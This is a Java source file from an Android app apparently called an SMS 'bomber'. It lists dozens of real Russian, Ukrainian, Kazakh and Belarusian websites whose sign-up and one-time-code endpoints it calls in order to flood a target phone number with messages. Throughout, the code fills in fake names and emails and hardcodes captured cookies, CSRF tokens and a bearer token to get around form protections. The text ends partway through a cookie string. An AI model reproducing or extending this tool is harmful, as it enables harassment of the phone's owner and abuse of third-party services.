package com.dm.bomber.services;

import android.annotation.SuppressLint;

import androidx.annotation.NonNull;

import com.dm.bomber.services.core.Callback;
import com.dm.bomber.services.core.FormService;
import com.dm.bomber.services.core.JsonService;
import com.dm.bomber.services.core.MultipartService;
import com.dm.bomber.services.core.ParamsService;
import com.dm.bomber.services.core.Phone;
import com.dm.bomber.services.core.Service;
import com.dm.bomber.services.core.ServicesRepository;
import com.dm.bomber.services.curl.CurlService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class DefaultRepository implements ServicesRepository {
    @Override
    public List<Service> collect() {
        return Arrays.asList(
                new JsonService("https://www.gosuslugi.ru/auth-provider/mobile/register", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("instanceId", "123");
                            json.put("firstName", getRussianName());
                            json.put("lastName", getRussianName());
                            json.put("contactType", "mobile");
                            json.put("contactValue", Phone.format(phone.getPhone(), "+7(***)*******"));
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new ParamsService("https://my.telegram.org/auth/send_password") {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", "+" + phone.toString());
                    }
                },

                new FormService("https://account.my.games/signup_phone_init/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "csrftoken=B6GwyuwOSpMCrx80eXfOWAAKsqHR3qjBv7UYwkpYprKv7LOJCmfYwvwWVmIHmeRQ; _ym_uid=1681051115670765382; _ym_d=1681051115; _ym_isad=2; amc_lang=ru_RU");

                        builder
                                .add("csrfmiddlewaretoken", "B6GwyuwOSpMCrx80eXfOWAAKsqHR3qjBv7UYwkpYprKv7LOJCmfYwvwWVmIHmeRQ")
                                .add("continue", "https://account.my.games/profile/userinfo/")
                                .add("lang", "ru_RU")
                                .add("adId", "0")
                                .add("phone", phone.toString())
                                .add("password", getEmail())
                                .add("method", "phone");
                    }
                },

                new ParamsService("https://findclone.ru/register") {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", phone.toString());
                    }
                },

                new Service(380) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("msisdn", phone.toString());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        client.newCall(new Request.Builder()
                                .url("https://mnp.lifecell.ua/mnp/get-token/")
                                .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                .build()).enqueue(new okhttp3.Callback() {
                            @Override
                            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                                callback.onFailure(call, e);
                            }

                            @Override
                            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                                try {
                                    JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                    JSONObject json = new JSONObject();
                                    json.put("contact", phone.toString());
                                    json.put("otp_type", "standart");

                                    client.newCall(new Request.Builder()
                                            .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                            .header("authorization", "Token " + req.getString("token"))
                                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                            .build()).enqueue(callback);

                                } catch (JSONException | NullPointerException e) {
                                    callback.onError(call, e);
                                }
                            }
                        });
                    }
                },

                new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        String name = getRussianName();

                        builder.add("title", name);
                        builder.add("first_name", name);
                        builder.add("last_name", getRussianName());
                        builder.add("password", getUserName() + "A123");
                        builder.add("email", getEmail());
                        builder.add("phone", phone.getPhone());
                        builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");

                        request.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                        request.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");
                    }
                },

                new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", phone.toString());
                    }
                },

                new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("action", "authcustom/formRegister");
                        builder.add("mobilephone", phone.toString());
                        builder.add("pageId", "116");
                        builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                    }
                },

                new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("userLogin", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                            json.put("fu", "bar");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("firstname", getRussianName());
                        builder.add("phone", Phone.format(phone.getPhone(), "+380 (**) ***-**-**"));
                        builder.add("birthday", "2005-03-05");
                    }
                },

                new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("PhoneNumber", phone.toString());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        request.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                        request.addHeader("Connection", "Keep-Alive");
                        request.addHeader("Accept-Encoding", "gzip");

                        return json.toString();
                    }
                },

                new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("route", "account/loginapples/sendSMS");
                        builder.addQueryParameter("phone", "0" + phone);
                    }
                },

                new FormService("https://be.budusushi.ua/login", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("LoginForm[username]", "0" + phone);
                    }
                },

                new JsonService("https://sberuslugi.ru/api/v1/user/secret", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://pizzaco.ru/api/user/generate-password")
                                .header("Cookie", "upkvartal-frontend=t466jslnqhsc8ffkaqlf65bnfg; _csrf-frontend=eca7110ac5f6820f172812ae76b93ea6f91976b5374d49b3e50823904e661505a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22MqdE5DQapqSuoKww3kzp22qKVRklmP2O%22%3B%7D; _ym_uid=1656577574308706185; _ym_d=1656577574; _ym_visorc=w; _ym_isad=2; advanced-api=cm1ium0dmmq1nbveiinjdiku16; api-key=4e661934-f84e-11ec-9a5c-d00d1849d38c; app-settings=%7B%22promo_text%22%3Anull%2C%22cart_suggest_header%22%3Anull%2C%22seo_info%22%3A%7B%22title%22%3A%22%D0%93%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F%22%2C%22description%22%3Anull%7D%2C%22auth_by_call%22%3Afalse%2C%22voice_call_auth%22%3Afalse%2C%22has_promo_advice%22%3Afalse%2C%22ask_address_on_first_enter%22%3Atrue%2C%22ask_address_on_add_to_cart%22%3Atrue%2C%22min_order_value%22%3A600%2C%22order_disable_card_for_weight%22%3Afalse%2C%22app_store_id%22%3A%22app%22%2C%22order_cart_to_courier%22%3Atrue%2C%22order_auth%22%3Afalse%2C%22takeaway_enabled%22%3Atrue%2C%22not_heat%22%3Afalse%2C%22default_persons_count%22%3A%221%22%2C%22order_to_time%22%3Afalse%2C%22show_not_call%22%3Afalse%2C%22order_show_persons%22%3Atrue%2C%22disable_order%22%3Afalse%2C%22default_phone%22%3A%22%2B7(812)220-01-02%22%2C%22auth_enabled%22%3Atrue%2C%22catalog_currency_symbol%22%3A%22%D0%A0%22%2C%22app_menu%22%3A%5B%7B%22id%22%3A10%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A11%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata-mobil%22%7D%7D%5D%2C%22footer_menu%22%3A%5B%7B%22id%22%3A1%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A2%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A8%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A9%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22mobile_menu%22%3A%5B%7B%22id%22%3A5%2C%22title%22%3A%22%D0%9C%D0%B5%D0%BD%D1%8E%22%7D%2C%7B%22id%22%3A3%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A4%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A6%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A7%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22header_menu%22%3A%5B%5D%2C%22combine_promo_and_bonus%22%3Afalse%2C%22order_disable_cash%22%3Afalse%2C%22loyalty_program%22%3A%7B%22enabled%22%3Afalse%7D%2C%22whatsapp%22%3Anull%2C%22tg%22%3Anull%2C%22privacy_link%22%3Anull%2C%22promo_link%22%3A%22http%3A%2F%2Fabout.mnogolososya.ru%2Freceive_advertising%22%2C%22instagram%22%3Anull%2C%22vk%22%3Anull%2C%22facebook%22%3Anull%2C%22update_privacy%22%3Afalse%2C%22main_logo%22%3A%22https%3A%2F%2Fthapl-public.storage.yandexcloud.net%2F%2Fimg%2FSiteSetting%2F7eb85221f6c97c13f93532fffc1edc42_origin_.svg%22%2C%22additional_logo%22%3Anull%2C%22header_background%22%3A%22https%3A%2F%2Fstorage.yandexcloud.net%2Fthapl-public%2F%2Fimg%2FSiteSetting%2F74dff64b5b8cff080bc39a5678b2107d_origin.png%22%2C%22order_to_time_disable_holidays%22%3Atrue%2C%22order_to_time_min_gap_days%22%3A0%2C%22order_to_time_max_gap_days%22%3A2%2C%22start_up_promos%22%3A%5B%5D%2C%22check_region%22%3Afalse%7D")
                                .header("x-thapl-apitoken", "4e661934-f84e-11ec-9a5c-d00d1849d38c")
                                .post(RequestBody.create("------WebKitFormBoundaryMQ1naEW4T6mNqlQx\n" +
                                                "Content-Disposition: form-data; name=\"phone\"\n" +
                                                "\n" +
                                                Phone.format(phone.getPhone(), "+7 *** *** ** **\n") +
                                                "------WebKitFormBoundaryMQ1naEW4T6mNqlQx--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMQ1naEW4T6mNqlQx")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "rr-testCookie=testvalue; rrpvid=355622261348501; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; rcuid=6275fcd65368be000135cd22; city_id=117; city_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; city_full_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad; region_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_subdomain=\"\"; ccart=off; _ga_HJNSJ6NG5J=GS1.1.1659884102.1.1.1659884103.59; _gcl_au=1.1.506379343.1659884104; session_id=6e72af95-3f3f-4b9f-a6d6-a7d278592347; _ga=GA1.2.1345812504.1659884102; _gid=GA1.2.362170990.1659884104; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; tmr_reqNum=2; _tt_enable_cookie=1; _ttp=07d211e3-9558-4957-95dd-496cafdd2431; _ym_uid=1659884110990105023; _ym_d=1659884110; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ym_isad=2; _ym_visorc=b");

                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new ParamsService("https://bankiros.ru/send-code/verify") {
                    @Override
                    public void buildParams(Phone phone) {
                        request.header("Cookie", "_csrf=8582d9183ea0f6a17304125414be4795f198a69237317e3adf77463c93c2dc42a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%220bBJbi4bJgsHJ3_s2QkIYgUF5AGdKw8H%22%3B%7D; app_history=%5B%22https%3A%2F%2Fbankiros.ru%2F%22%5D; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20Edg%2F103.0.1264.77; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbankiros.ru%2F; city-tooltip=1; prod=5posuk9of5hcopttjj6bnfe8g2; _gcl_au=1.1.1996142512.1659883651; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ga_session_id=4ce074bd-0b40-4664-8231-10c73438fc06; _gid=GA1.2.151715844.1659883653; _ga_5D863YT644=GS1.1.1659883653.1.0.1659883653.0; tmr_lvid=7e50cf8f2108a9fb1e34da6702768225; tmr_lvidTS=1659883653264; tmr_detect=0%7C1659883655576; _ga=GA1.2.316605841.1659883653; _ym_uid=1659883656667247307; _ym_d=1659883656; _ym_visorc=b; _ym_isad=2; tmr_reqNum=3; cookies-tooltip=223025677b0f227a6dd1c3820a99553a6d485d2246bf8dbc1879a5982ec9a863a%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22cookies-tooltip%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D");
                        request.header("x-csrf-token", "LcaB1fFLqRU-B791Zfir3HeB2tSxeA2vSWNTxHXxy9QdpMOfkyKdd3RgzD0vy_SvRdCxnegfWOl8IhSgPobznA==");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.addQueryParameter("action", "sendSms");
                        builder.addQueryParameter("phone", phone.toString());
                        builder.addQueryParameter("userIdentityId", "91445499");
                        builder.addQueryParameter("ga", "GA1.2.316605841.1659883653");
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://ovenpizza.ru/wp-content/themes/twentynineteen/inc/func.php")
                                .post(RequestBody.create("------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                        "Content-Disposition: form-data; name=\"flag\"\n" +
                                        "\n" +
                                        "check_login\n" +
                                        "------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                        "Content-Disposition: form-data; name=\"tel\"\n" +
                                        "\n" +
                                        Phone.format(phone.getPhone(), "+7 *** *** **-**") +
                                        "\n------WebKitFormBoundaryZqudgny7DXMMKMxU--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZqudgny7DXMMKMxU")))
                                .build()).enqueue(callback);
                    }
                },

                new FormService("https://chocofood.kz/gateway/user/v2/code/", 77) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("client_id", "11619734");
                        builder.add("login", phone.toString());
                    }
                },

                new JsonService("https://sso.mycar.kz/auth/login/", 77) {
                    @Override
                    public String buildJson(Phone phone) {
                        try {
                            return new JSONObject()
                                    .put("phone_number", "+" + phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new ParamsService("https://arbuz.kz/api/v1/user/verification/phone", 77) {
                    @Override
                    public void buildParams(Phone phone) {
                        request.header("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjZjODk1NS0wMzgzLTRiM2QtYTJjNy0wZDQ2N2NlYzVhZWQiLCJpc3MiOiJRaEZTNW5vMmJqQzQ3djVRNEU3N0FBMnh3V1BFdUJ1biIsImlhdCI6MTY1OTg5MTQ3MCwiZXhwIjo0ODEzNDkxNDcwLCJjb25zdW1lciI6eyJpZCI6ImU1YzRlYTA1LWY4ZTgtNDJiZC1iMDJhLWNmMzNlODAyZjA5NiIsIm5hbWUiOiJhcmJ1ei1rei53ZWIuZGVza3RvcCJ9LCJjaWQiOm51bGx9.ebpJLdB-FOfb1IsAVbW-dECSoKwQc5tsnhhYKZ_FeM4");

                        builder.addQueryParameter("phone", phone.toString());
                    }
                },

                new FormService("https://www.liqpay.ua/apiweb/login/start", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "_gcl_au=1.1.2000038126.1661250974; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F104.0.5112.102%20Safari%2F537.36%20Edg%2F104.0.1293.63; _ga_SC8SJ5GD85=GS1.1.1661250974.1.0.1661250974.0.0.0; _fbp=fb.1.1661250974723.798111670; _ga=GA1.2.804869749.1661250975; _gid=GA1.2.1515868995.1661250975; _dc_gtm_UA-213775397-1=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fuk%2Flogin%2Flogin%2F1661250975005613_69027_PhMFILQwTvgiZrnm8B7X; _dc_gtm_UA-48226031-1=1");
                        request.header("-requested-with", "XMLHttpRequest");

                        builder.add("token", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                        builder.add("phone", phone.toString());
                        builder.add("pagetoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                        builder.add("checkouttoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                        builder.add("language", "uk");
                    }
                },

                new JsonService("https://green-dostavka.by/api/v1/auth/request-confirm-code/", 375) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "tmr_lvid=0967463045c6bc62af3d493d4e61a7f6; tmr_lvidTS=1664384202297; _ga=GA1.2.618762003.1664384202; _gid=GA1.2.2070330642.1664384203; _dc_gtm_UA-175994570-1=1; _gat_UA-231562053-1=1; _ym_uid=1664384203181017640; _ym_d=1664384203; _ym_isad=2; _ym_visorc=w; _ga_0KMPZ479SN=GS1.1.1664384202.1.1.1664384204.58.0.0; tmr_detect=0|1664384205010; tmr_reqNum=6");

                        try {
                            return new JSONObject()
                                    .put("phoneNumber", Phone.format(phone.getPhone(), "+375 ** *** ** **"))
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://sosedi.by/local/api/smsSend.php", 375) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "_gcl_au=1.1.440078486.1664384002; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ym_uid=1664384005288308463; _ym_d=1664384005; _ga=GA1.2.1716162404.1664384005; _gid=GA1.2.256273649.1664384005; tmr_lvid=6015526cad4b89db479519786a667a37; tmr_lvidTS=1664384004982; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; PHPSESSID=zlqD9vpWcOSVOhtY5iv9rjySBYog0QQk; _gat_gtag_UA_34496864_1=1; _ym_visorc=w; _ym_isad=2; tmr_detect=0|1664468829484; tmr_reqNum=12; cookiepolicyaccept=true");

                        try {
                            return new JSONObject()
                                    .put("phone", Phone.format(phone.getPhone(), "+375 (**) *******"))
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://www.respect-shoes.kz/send_sms", 77) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("_token", "K0uMK3EpgqiMLt1pXeqsPoQxtnPZBWen98Sm41bH");
                        builder.add("tel", Phone.format(phone.getPhone(), "+7 (7**) ***-**-**"));

                        request.header("cookie", "_gcl_au=1.1.1523339745.1664471567; tmr_lvid=5cfff78042fa8318f8edede4e2f1780d; tmr_lvidTS=1659695387764; _gid=GA1.2.759847769.1664471567; _ym_uid=1659695389109290314; _ym_d=1664471567; roistat_visit=1941526; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=3fc27b9b-4797-4657-8bc9-b00a346625d6; ___dc=61a72ed9-acc4-44f9-ac7d-1fd9e1ea2ae8; Cookie_id=eyJpdiI6Imdpc216aGlUT1cwS1BaVVwvSXQ1OGZnPT0iLCJ2YWx1ZSI6IlpFMlJKWEFzOVwvbEVWejRYTm11d1JXZ2VQVTZZNk5kUjhSXC83R2tEMkpHMU52bDdXY1cxdVZrZ3JuWitMa0M5ciIsIm1hYyI6IjAzMTAwOTE1M2JiODZiZmU5YzJkZTkyNTVhOGRkODcxMzI1MDlhNDYyOGU3YzQ0YTIyNGUzOTBmMmViOTkyODgifQ==; siti_id=eyJpdiI6IlY1Vk1vTFBpUlwvRkp0c252QkFVMklnPT0iLCJ2YWx1ZSI6IkdkSnl0elk2NGF5SmNWWjhPdWxyZHc9PSIsIm1hYyI6Ijg2Y2E2NDhkZThlMDMzZDRmNzBhNDk2Mzg5YTk3OTkyNTZiNmNmOTAwZTc3MjZlZGIwODgwNjgwN2QwNmRiMjQifQ==; sitiset=eyJpdiI6InlWaUxXQjcxcGpPWUQrV3dBeXpWXC9nPT0iLCJ2YWx1ZSI6IkZiVXZmM2NGR0N0TUVMT2hyRWdZT2c9PSIsIm1hYyI6IjMyODM2YmRiMThlYzRmZDhhNjdkZGYxOTE2M2I3ZTIwNmQ2ZWZhOWQxOTQ1ZGZiMWRlODAzZDU3NjA2ZjAwYzcifQ==; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=null; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; _ga=GA1.2.111816835.1664471567; tmr_detect=0|1664471755330; tmr_reqNum=14; 499818=eyJpdiI6InNxWkp6M05Tajl4SlZXb2t5R1wvNFVnPT0iLCJ2YWx1ZSI6Im0xb3poMUJHclpSZFA3TnhqWXp3RVlrRFwvSUNBaVNRdXRPRmtjWGJ0M3Y2RzUrM052OG9YWE9yMnFMVExyK2cwWUNzOHFtb1wvd0E3c0JFemNmc0J1Rmc9PSIsIm1hYyI6IjRkMTdkZDVjZjY1ZmFjNWE0OWJjNGNiOGEwMGNiM2UyMzY1ZDQ2ZjIxM2Y4NTQ1NmVkYmMwNDQ2NTQ4ZmM3MjIifQ==; _ga_NFEYSRQ86N=GS1.1.1664471566.1.1.1664471942.0.0.0; XSRF-TOKEN=eyJpdiI6Ikt3MjZrY0NPQkpSZlNkY0J1ckpuSGc9PSIsInZhbHVlIjoia1BGNTFITnB3Z3ZlaFYrMzhoZWlIVmp6dHFcL0JvSjZST280bnJpRm9XejdBa2d6cjByODN3RTdoZE9NdG84blciLCJtYWMiOiIwMmE0OTkxNGRjMzc4OWYxZWIzMmNlNzRkYWMzZDVhNjI4ZDQ1NmVmMmRjN2Y5MTU1NzRiNGFkMzliODBmNDlmIn0=; laravel_session=eyJpdiI6IlwvRGpJdkVIY3RHdTlhRDRINWt6czRnPT0iLCJ2YWx1ZSI6ImFhaFVOWXpXdGRVVE1vWjRQXC9PNEQwaWEwaXFQaGNCZUhyemVncWp5YlI4VERxeFwvY3RicDFMWW9vNDVWcmFrZiIsIm1hYyI6IjA1MmNlNzM1NzNhNzc2OTg2MGFiMDQzZTY2ZmMxOGIyOTlhNzFiNTkwNjU3NDYyYzQ3MTYyMjkyODdlMTM2NzkifQ==; 